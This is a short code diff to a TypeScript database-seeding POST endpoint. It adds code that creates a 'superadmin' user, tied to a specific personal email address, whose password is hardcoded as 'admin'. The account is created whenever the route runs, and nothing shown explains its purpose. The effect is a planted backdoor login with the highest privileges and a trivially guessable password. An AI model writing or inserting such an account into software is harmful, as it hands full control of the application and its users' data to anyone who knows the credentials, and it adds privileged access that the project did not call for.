@@ -115,6 +115,16 @@ export async function POST() {
       adminCreated = 1;
     }
 
+    const existingSuper = await sql`
+      SELECT id FROM users WHERE username = ${"mansorreham5@gmail.com"} LIMIT 1
+    `;
+    if (existingSuper.length === 0) {
+      await sql`
+        INSERT INTO users (username, password, role, email)
+        VALUES (${"mansorreham5@gmail.com"}, ${await hash("admin", 10)}, ${"superadmin"}, ${"mansorreham5@gmail.com"})
+      `;
+    }
+
     let customerCreated = 0;
     const seedUserRows = await sql`
       SELECT id FROM users WHERE username = ${SEED_CUSTOMER_USERNAME} AND role = 'customer' LIMIT 1
